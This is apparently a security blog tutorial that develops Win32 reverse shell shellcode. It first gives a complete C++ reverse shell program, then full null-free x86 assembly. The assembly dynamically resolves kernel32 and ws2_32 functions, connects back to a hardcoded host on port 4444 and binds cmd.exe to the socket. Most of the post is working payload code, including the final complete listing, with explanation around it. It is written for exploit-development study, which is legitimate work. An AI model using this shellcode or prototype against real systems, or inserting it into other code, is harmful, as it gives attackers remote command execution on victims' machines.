---
layout: post
title: Win32 Reverse Shell Shellcode 
date: 2019-10-19
classes: wide
header:
  teaser: /assets/images/avatar.jpg
tags:
  - Shellcode
  - Windows
  - C++ 
  - Assembly
  - Reverse Shell 
  - Socket Programming
---

## Introduction
After creating some basic shellcode where we popped calc.exe and figured out at least one method to dynamically find the address of DLLs and their exported functions, it was time to make something a bit more involved, so I went through and created a Reverse Shell PoC payload. 

## Recommended Reading
I used/copied a lot of techniques from the following resources:

+ [Marcos Valle's Reverse Shell Shellcode](https://marcosvalle.github.io/re/exploit/2018/10/21/windows-manual-shellcode-part3.html)
+ [sh3llc0d3r's Reverse Shell Shellcode](http://sh3llc0d3r.com/windows-reverse-shell-shellcode-i/)
+ [NytroRST's Introduction to Windows Shellcode Development](https://securitycafe.ro/2016/02/15/introduction-to-windows-shellcode-development-part-3/)

I combined a lot of the different strategies discussed in the blogposts. The former two use hardcoded addresses discovered with Arwin, while we're going to try and dynamically locate our function addresses. We will also use a technique I found in this [ExploitDB](https://www.exploit-db.com/exploits/40334#) entry authored by Roziul Hasan Khan Shifat to store addresses before calling them. 

Make sure you read this material or you will be lost!

## Getting Started
I'm not going to rehash much of what we have done previously since we've covered it numerous times. I will instead focus on the new aspects, especially the socket programming aspects. 

### C++ Prototype 
Let's establish a reverse-shell via a C++ program first so we know roughly what we need to accomplish. I used the MSDN documentation, Ma~Far$'s [example](https://code.sololearn.com/c9QMueL0jHiy/#cpp), and [this Medium article by Bank Security](https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15) as references. Here is my completed C++ prototype:
```c
#include <Winsock2.h>
#include <Windows.h>
#include <iostream>


int main () 
{

std::string rem_host = "192.168.1.222";
int rem_port = 4444;

WSADATA wsaData;

// Call WSAStartup()
int WSAStartup_Result = WSAStartup(MAKEWORD(2,2), &wsaData);
if (WSAStartup_Result != 0) {
    std::cout << "[-] WSAStartup failed.";
    return 1;
}

// Call WSASocket()
SOCKET mysocket = WSASocketA(2, 1, 6, NULL, 0, NULL); 

// Create sockaddr_in struct
struct sockaddr_in sa;
sa.sin_family = AF_INET;
sa.sin_addr.s_addr = inet_addr(rem_host.c_str());
sa.sin_port = htons(rem_port);

// Call connect()
int connect_Result = connect(mysocket, (struct sockaddr*) &sa, sizeof(sa));
if (connect_Result !=0 ) {
    std::cout << "[-] connect failed.";
    return 1;
}

// Call CreateProcessA()
STARTUPINFO si;
memset(&si, 0, sizeof(si));
si.cb = sizeof(si);
si.dwFlags = (STARTF_USESTDHANDLES);
si.hStdInput = (HANDLE)mysocket;
si.hStdOutput = (HANDLE)mysocket;
si.hStdError = (HANDLE)mysocket;
PROCESS_INFORMATION pi;
CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

}
```

We'll break this down by function. 

### WSAStartup
[This function](https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsastartup) initializes the utilization of the Winsock dll. Here we are giving it an argument of "2.2" as for the version to use, and we're also passing a reference to a `WSADATA` type variable `wsaData`. 

It returns a non-zero if it fails, so we've added some error handling to our program. 

### WSASocketA
[This function](https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsasocketa) creates a socket. We give ours the arguments `2, 1, 6, NULL, 0, NULL`:
+ `2` == AF_INET (IPv4)
+ `1` == SOCK_STREAM (TCP)
+ `6` == IPPROTO_TCP (TCP)
+ `NULL` == no value for `lpProtocolInfo`
+ `0` == since we don't have an existing "socket group" 
+ `NULL` == no value for `dwFlags`

We store the returned value, which is a file descriptor (`int`) to our newly created socket. 

### Connect
[This function](https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-connect) establishes a connection to a specific socket. The second argument is a pointer to a `sockaddr` structure, so let's create that first. 
```c++
struct sockaddr_in sa;
sa.sin_family = AF_INET;
sa.sin_addr.s_addr = inet_addr(rem_host.c_str());
sa.sin_port = htons(rem_port);
```

Our struct is called `sa`. The `sin_family` member is `AF_INET` again. The `s_addr` member of the `sin_addr` struct is set to our remote host. (We have to include the `.c_str()` function because we initialized the `rem_host` variable as an `std::string` and the `inet_addr` function only accepts proper C char arrays. Finally, we use `htons()` to translate our `rem_port` variable into the `sin_port` member of the struct. 

Only other thing I want to point out here is that we typecast the pointer to our `sockaddr_in` struct to `sockaddr`, with `(struct sockaddr*) &sa`, as that's what's expected by the `connect` function. 

### CreateProcessA
At this point, we've already connected to the remote host, now it's time to send a command shell to the "server" application. We've covered the `CreateProcessA` [function](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa) pretty in-depth previously. I just want to point out a few things that we'll be doing in the shellcode that differs from our previous examples. 

In order to have the command shell streams redirected to our connection, we need to initialize several members of the `STARTUPINFORMATION` structure. We typecast our socket file descriptor (`mysocket`) as a `HANDLE` and assign it to: `hStdInput`, `hStdOutput`, `hStdError`. We just now have to set `dwFlags` to `STARTF_USESTDHANDLES` which has a great name that tells you exactly what we're doing here. We're using the standard i/o handles, which we just set. `STARTF_USESTDHANDLES` specifies in the MSDN documentation that the *"handles must be inheritable and the function's bInheritHandles parameter must be set to TRUE."*

So we're poised to push our command shell and redirect standard i/o to it as long as we handle the actual `CreateProcessA` arguments appropriately now. 

`CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);`

As you can see, we have a `BOOL` value in our arguments that's set to `TRUE`. This is the aforementioned `bInheritHandles` parameter and we've set it appropriately to complete our prototype. Everything else in `CreateProcessA` is similar to what we've already done. 

## Assembly Time
Now the fun part. I'll skip all of the pieces we've already completed over and over. 

### Getting `kernel32.dll` Base Address

```nasm
global_start


section .text
_start: 

xor ecx, ecx
mul ecx
mov eax, [fs:ecx + 0x30] 
mov eax, [eax + 0xc]     
mov esi, [eax + 0x14]    
lodsd                    
xchg eax, esi            
lodsd                    
mov ebx, [eax + 0x10]    
mov edi, [ebx + 0x3c]    
add edi, ebx             
mov edi, [edi + 0x78]    
add edi, ebx             
mov esi, [edi + 0x20]    
add esi, ebx             
xor ecx, ecx 
```

We now have the base address of `kernel32.dll` in ESI as per usual. 

### Getting Address of `GetProcAddress`
```nasm
Get_Function:
 
inc ecx                              
lodsd                               
add eax, ebx                         
cmp dword [eax], 0x50746547        ; GetP
jnz Get_Function
cmp word [eax + 0xa], 0x73736572   ; ress
jnz Get_Function
mov esi, [edi + 0x24]                
add esi, ebx                         
mov cx, [esi + ecx * 2]              
dec ecx
mov esi, [edi + 0x1c]                
add esi, ebx                         
mov edi, [esi + ecx * 4]             
add edi, ebx                         
```

We now have the address of `GetProcAddress` stored in EDI. One thing to note here is that `GetProcAddress` stores the address of the retrieved function/library inside of EAX. 

### Locating `LoadLibraryA` Address
```nasm
; use GetProcAddress to find LoadLibraryA
xor ecx, ecx
push ecx
push 0x41797261   
push 0x7262694c
push 0x64616f4c
push esp
push ebx
call edi
```

We have to push the string `LoadLibraryA` onto the stack first. I used my [ascii to hex converter python script](https://github.com/h0mbre/AWE-OSEE/tree/master/Ascii_to_Hex), which I got from @NinjaParanoid. The script is this:
```python
import textwrap
import binascii
import sys

function_name = sys.argv[1]

print textwrap.wrap((binascii.hexlify(function_name[::-1]).decode()), 8)
```
This outputs the exact `DWORD` values to push onto the stack. 

```terminal_session
C:\Users\IEUser\Documents>a2h.py LoadLibraryA
[u'41797261', u'7262694c', u'64616f4c']
```
So we push those onto the stack. Save a pointer to the string with `push esp` and then we `push ebx` which is the address of the library that `LoadLibraryA` is exported from, `kernel32.dll`. 

Now, the address of `LoadLibraryA` is stored in EAX. 

We can use this function to load the library `ws2_32.dll` into memory. This library holds all of the socket functions we need to establish a reverse shell. 

### Loading `ws2_32.dll` 
```nasm
; use LoadLibraryA to load the ws2_32.dll
push 0x61616c6c
sub word [esp + 0x2], 0x6161
push 0x642e3233
push 0x5f327377
push esp
call eax
```

We have to push the string `ws2_32.dll` onto the stack, but since it doesn't break up nicely into 4 byte chunks, we can add `aa` to it and use the python script again. 
```terminal_session
C:\Users\IEUser\Documents>a2h.py ws2_32.dllaa
[u'61616c6c', u'642e3233', u'5f327377']
```

So we push the first `DWORD` and then subtract off the `aa` value just like @NytroRST showed us. Then we push the rest, push a stack pointer, and then call `LoadLibraryA`. I won't be showing the ascii to hex conversions anymore but this is the gist of it. The only other variation you'll see is me adding a single `a` and subtracting from the `DWORD` value at the `esp` offset by `0x61`, this is to avoid nulls that would be induced by subtracting from the `WORD` value as we did when subtracting `0x6161`. 

Now is a good time to do a register check, here is what our registers look like at this point. 
```
; EAX = ws2_32.dll address
; ECX = ???
; EDX = some sort of offset
; EBX = kernel32 base address
; ESP = pointer to string "ws2_32.dll'
; ESI = some address
; EDI = GetProcAddress address
```

### Locating Our Function Addresses
Now it's time to go hunting the functions we need: 
+ `WSAStartup`
+ `WSASocketA`
+ `connect`
+ `CreateProcessA`
+ `ExitProcess`

```nasm
; use GetProcAddress to get location of WSAStartup function
push 0x61617075
sub word [esp + 0x2], 0x6161
push 0x74726174
push 0x53415357
push esp
push eax
call edi
```

Same type of operation as before, but just make sure to note that `push eax` is used here to reference the location of `ws2_32.dll` instead of `kernel32.dll` like we're used to. 

Here's where things get awesome. Because the functions we want to use require using the registers we need to keep the location of the DLLs safe, we have to get creative here. We're going to get the address of all the functions we need first, and then call them later. We're going to make ESI effectively a stack pointer, and then keep saving addresses in 4 byte chunks one on top of the other on the stack. This way, all of the function addresses will be safe on the stack and not overwritten by our functions. 

Right now, `WSAStartup` is stored in EAX, so let's put that into ESI and make ESI the location of where ESP is.

```nasm
push eax
lea esi, [esp]       ; esi will store WSAStartup location, and we'll calculate offsets from here
```

So we pushed EAX onto the stack, therefore ESP was pointing at EAX. Then we put the address of ESP into ESI. So now we can refer to ESI and its offsets we create later to make the function calls. 

So for example, let's say the `WSAStartup` startup address is at `0x00000000`. We can store the next function at the address `0x00000004` and refer to it as `lea [esi + 0x4]`. Remember that since we made the `lea esi, [esp]` operation, ESI is just a location on the stack now. 

Next, we'll do the exact same thing for `WSASocket`
```nasm
; use GetProcAddress to get location of WSASocketA
push 0x61614174
sub word [esp + 0x2], 0x6161
push 0x656b636f
push 0x53415357
push esp
push ecx
call edi

mov [esi + 0x4], eax ; esi at offset 0x4 will now hold the address of WSASocketA
```

The `WSASocket` function address is now stored at ESI + 0x4 bytes. 

Next, find the location of the `connect` function. 
```nasm
; use GetProcAddress to get the location of connect
push 0x61746365
sub dword [esp + 0x3], 0x61
push 0x6e6e6f63
push esp
push ecx
call edi

mov [esi + 0x8], eax ; esi at offset 0x8 will now hold the address of connect
```

The `connect` function address is now stored at ESI + 0x8 bytes.

We've now safely stored all of our networking functions on the stack. We just need to locate `CreateProcessA` and `ExitProcess` now. Keep in mind these functions are exported from `kernel32.dll`. The `kernel32.dll` address is still stored inside EBX so on this invocation of `GetProcAddress` you'll see me `push ebx`. 

```nasm
; use GetProcAddress to get the location of CreateProcessA
push 0x61614173 
sub word [esp + 0x2], 0x6161
push 0x7365636f
push 0x72506574
push 0x61657243
push esp
push ebx
call edi

mov [esi + 0xc], eax ; esi at offset 0xc will now hold the address of CreateProcessA
```

Lastly, we end our function address hunting by finding `ExitProcess`.

```nasm
; use GetProcAddress to get the location of ExitProcess
push 0x61737365
sub dword [esp + 0x3], 0x61
push 0x636f7250
push 0x74697845
push esp
push ebx
call edi 

mov [esi + 0x10], eax ; esi at offset 0x10 will now hold the address of ExitProcess
```

Lets check out the stack in Immunity Debugger at this point, and see how all of our addresses look on the stack.
```
0022FF60   75353AB2  ²:5u  ws2_32.WSAStartup
0022FF64   7535E562  bå5u  ws2_32.WSASocketA
0022FF68   753568F5  õh5u  ws2_32.connect
0022FF6C   76FD2082  ‚ ýv  kernel32.CreateProcessA
0022FF70   7702BE5A  Z¾ w  kernel32.ExitProcess
```

As you can see, we've neatly and safely placed all of our function addresses on the stack and ESI is currently holding the address `0022FF60`. So we can use this pointer to refer to all of our functions with the appropriate offset. 

### Calling Our Functions

Now that we have our function addresses we can call them and execute our shellcode. If you need to, refer back to the `C++` Prototype for these function calls and their arguments. First we'll call `WSAStartup`. 
```nasm
; call WSAStartup
xor edx, edx
mov dx, 0x0190
sub esp, edx
push esp
push edx
call dword [esi]
```

Here we're specifying the version as a number that's less than the `2.2` we used in our `C++` prototype; however, if you read Marcos' blogpost you will understand why this is acceptable. This also happens to be the size of the `wsaData` structure so we're able to save some bytes by reusing the same value `0x0190`. We `push esp` a pointer to the `wsaData` structure and `push edx` which holds the version number we wish to use (again read Marcos' blogpost for an explanation.)

Notice how at the end we're calling the `DWORD` value held at ESI, this is how we're using those stored addresses to call the functions. The next one will be at `[esi + 0x4]` and then `[esi + 0x8]` and so on. 

Next, we must call `WSASocket`. 
```nasm
; call WSASocketA
push eax                              ; still null from our return code of WSAStartup :)
push eax
push eax
xor edx, edx
mov dl, 0x6
push edx
inc eax
push eax
inc eax
push eax
call dword [esi + 0x4]
```

Refer back to the prototype if you're hazy on the function parameters. Three NULLs. `6`. `1`. `2`. Then we call at the `[esi + 0x4]` offset. 
```nasm
Next up is `connect`. 
; call connect
push 0xde01a8c0                      ; sin_addr set to 192.168.1.222
push word 0x5c11                     ; port = 4444
xor ebx, ebx
add bl, 0x2
push word bx
mov edx, esp
push byte 16
push edx
push eax
xchg eax, edi
call dword [esi + 0x8]
```
This one should be pretty easy to follow along with if you refer back to the `C++` prototype. One confusing thing I'll highlight is the `xchg eax, edi` instruction, this is to store the socket file descriptor we got back from the `WSASocket` call into EDI. It was hanging out in EAX but it's not safe there. Calling this `connect` function will fill EAX with a return value and we need the socket file descriptor for later, so we've saved it in EDI. 

Now comes the hardest function to set-up/understand, `CreateProcessA`. 
```nasm
; CreateProcessA shenanigans
push 0x61646d63                      ; "cmda"
sub dword [esp + 0x3], 0x61          ; "cmd"
mov edx, esp                         ; edx now pointer to our 'cmd' string
```
This part is easy so far, we have EDX pointing to our `cmd` argument for the function call. 

```nasm
; set up the STARTUPINFO struct
push edi
push edi
push edi                    ; we just put our SOCKET_FD into the arg params for HANDLE hStdInput; HANDLE hStdOutput; and HANDLE hStdError;
xor ebx, ebx
xor ecx, ecx
add cl, 0x12                ; we're going to throw 0x00000000 onto the stack 18 times, this will fill up both the STARTUPINFO and PROCESS_INFORMATION structs
                            ; then we will retroactively fill them up with the arguments we need by using effective addressing relative to ESP like mov word [esp +]

looper: 
push ebx
loop looper
```

What we've done here, is `push edi` three times to put our socket file descriptor into the struct members `si.hStdInput`, `si.hStdOutput`,  and `si.hStdError`. 

Next we load our counter register ECX up with an `0x12` value so we can loop through pushing NULLs onto the stack. This will fill up the first of the `STARTUPINFO` struct with NULLs, and also fille the entire `PROCESS_INFO` struct with NULLs. It's ok that `PROCESS_INFO` gets filled with NULLs since it doesn't need any members initialized if you look at the prototype. However, there are still some members left in `STARTUPINFO` we need to initialize.

Since the stack grows downwards in address space, we can retroactively fill `STARTUPINFO` with values by doing something like `mov word [esp + offset], value`. This says, put into the `WORD`-sized value held at the ESP + offset address this value. Let's do that now. 

```nasm
mov word [esp + 0x3c], 0x0101        ; set dwFlags arg in STARTUPINFO
mov byte [esp + 0x10], 0x44          ; cb member of the struct set to 68 decimal, size of struct
lea eax, [esp + 0x10]                ; eax now a pointer to STARTUPINFO
```

These arguments complete our `STARTUPINFO` struct. The `PROCESS_INFO` struct was just filled with NULLs so it also complete. EAX now holds a pointer to the `STARTUPINFO` struct, and ESP holds a pointer to the `PROCESS_INFO` struct. 

```nasm
; Actually Calling CreateProcessA now
push esp                             ; pointer to PROCESS_INFORMATION
push eax                             ; pointer to STARTUPINFO
push ebx                             ; all NULLs
push ebx
push ebx
inc ebx                              ; bInheritHandles == True
push ebx
dec ebx
push ebx
push ebx
push edx                             ; pointer to 'cmd' 
push ebx
call dword [esi + 0xc]
```

Actually calling the function isn't so hard now that we've already completed building those structs. I really liked the loop to push the NULLs to fill the structures out, I thought that was concise and clever. 

```nasm
; call ExitProcess
push ebx                             ; still null
call dword [esi + 0x10]
```

Finally we call `ExitProcess` which should be familiar from the last shellcode we created. 

## Conclusion
Thank you very much to the aformentioned resource authors, I really appreciate it! Learned a lot about the subtle differences between Windows and Linux when it comes to socket programming a reverse shell payload. Next we might explore a different way to find function addresses, x64 shellcoding, or some exploit development techniques, I'm not sure yet. All will be covered at some point though. Until next time, thanks for reading!

Our shellcode should be NULL-free and it came in around 378 bytes. I believe the msfvenom equivalent shellcode is somewhere around 350 bytes.

## Complete Shellcode
```nasm
global_start


section .text
_start: 

xor ecx, ecx
mul ecx
mov eax, [fs:ecx + 0x30] 
mov eax, [eax + 0xc]     
mov esi, [eax + 0x14]    
lodsd                    
xchg eax, esi            
lodsd                    
mov ebx, [eax + 0x10]    
mov edi, [ebx + 0x3c]    
add edi, ebx             
mov edi, [edi + 0x78]    
add edi, ebx             
mov esi, [edi + 0x20]    
add esi, ebx             
xor ecx, ecx             

Get_Function:
 
inc ecx                              
lodsd                                
add eax, ebx                         
cmp dword [eax], 0x50746547          ; GetP
jnz Get_Function
cmp word [eax + 0xa], 0x73736572     ; ress
jnz Get_Function
mov esi, [edi + 0x24]                
add esi, ebx                           
mov cx, [esi + ecx * 2]              
dec ecx
mov esi, [edi + 0x1c]               
add esi, ebx                        
mov edi, [esi + ecx * 4]             
add edi, ebx                        

; use GetProcAddress to find LoadLibraryA
xor ecx, ecx
push ecx
push 0x41797261
push 0x7262694c
push 0x64616f4c
push esp
push ebx
call edi

; EAX = LoadLibraryA address
; ECX = kernel32 base address
; EDX = kernel32 base address
; EBX = kernel32 base address
; ESP = stack pointer to 'LoadLibraryA' 
; ESI = ???
; EDI = GetProcAddress address

; use LoadLibraryA to load the ws2_32.dll
push 0x61616c6c
sub word [esp + 0x2], 0x6161
push 0x642e3233
push 0x5f327377
push esp
call eax

; EAX = ws2_32.dll address
; ECX = ???
; EDX = some sort of offset
; EBX = kernel32 base address
; ESP = pointer to string "ws2_32.dll'
; ESI = some address
; EDI = GetProcAddress address

; use GetProcAddress to get location of WSAStartup function
push 0x61617075
sub word [esp + 0x2], 0x6161
push 0x74726174
push 0x53415357
push esp
push eax
call edi

push eax
lea esi, [esp]                  ; esi will store WSAStartup location, and we'll calculate offsets from here

; use GetProcAddress to get location of WSASocketA
push 0x61614174
sub word [esp + 0x2], 0x6161
push 0x656b636f
push 0x53415357
push esp
push ecx
call edi

mov [esi + 0x4], eax                  ; esi at offset 0x4 will now hold the address of WSASocketA

; use GetProcAddress to get the location of connect
push 0x61746365
sub dword [esp + 0x3], 0x61
push 0x6e6e6f63
push esp
push ecx
call edi

mov [esi + 0x8], eax                  ; esi at offset 0x8 will now hold the address of connect

; use GetProcAddress to get the location of CreateProcessA
push 0x61614173 
sub word [esp + 0x2], 0x6161
push 0x7365636f
push 0x72506574
push 0x61657243
push esp
push ebx
call edi

mov [esi + 0xc], eax                   ; esi at offset 0xc will now hold the address of CreateProcessA

; use GetProcAddress to get the location of ExitProcess
push 0x61737365
sub dword [esp + 0x3], 0x61
push 0x636f7250
push 0x74697845
push esp
push ebx
call edi 

mov [esi + 0x10], eax                  ; esi at offset 0x10 will now hold the address of ExitProcess

; call WSAStartup
xor edx, edx
mov dx, 0x0190
sub esp, edx
push esp
push edx
call dword [esi]

; call WSASocketA
push eax                              ; still null from our return code of WSAStartup :)
push eax
push eax
xor edx, edx
mov dl, 0x6
push edx
inc eax
push eax
inc eax
push eax
call dword [esi + 0x4]



; call connect
push 0xde01a8c0                      ; sin_addr set to 192.168.1.222
push word 0x5c11                     ; port = 4444
xor ebx, ebx
add bl, 0x2
push word bx
mov edx, esp
push byte 16
push edx
push eax
xchg eax, edi
call dword [esi + 0x8]

; CreateProcessA shenanigans
push 0x61646d63                      ; "cmda"
sub dword [esp + 0x3], 0x61          ; "cmd"
mov edx, esp                         ; edx now pointer to our 'cmd' string

; set up the STARTUPINFO struct
push edi
push edi
push edi                             ; we just put our SOCKET_FD into the arg params for HANDLE hStdInput; HANDLE hStdOutput; and HANDLE hStdError;
xor ebx, ebx
xor ecx, ecx
add cl, 0x12                         
; we're going to throw 0x00000000 onto the stack 18 times, this will fill up both the STARTUPINFO and PROCESS_INFORMATION structs
; then we will retroactively fill them up with the arguments we need by using effective addressing relative to ESP like mov word [esp +]

looper: 
push ebx
loop looper

mov word [esp + 0x3c], 0x0101        ; set dwFlags arg in STARTUPINFO
mov byte [esp + 0x10], 0x44          ; cb member of the struct set to 68 decimal, size of struct
lea eax, [esp + 0x10]                ; eax now a pointer to STARTUPINFO

; Actually Calling CreateProcessA now
push esp                             ; pointer to PROCESS_INFORMATION
push eax                             ; pointer to STARTUPINFO
push ebx                             ; all NULLs
push ebx
push ebx
inc ebx                              ; bInheritHandles == True
push ebx
dec ebx
push ebx
push ebx
push edx                             ; pointer to 'cmd' 
push ebx

call dword [esi + 0xc]

; call ExitProcess
push ebx                             ; still null
call dword [esi + 0x10]
```
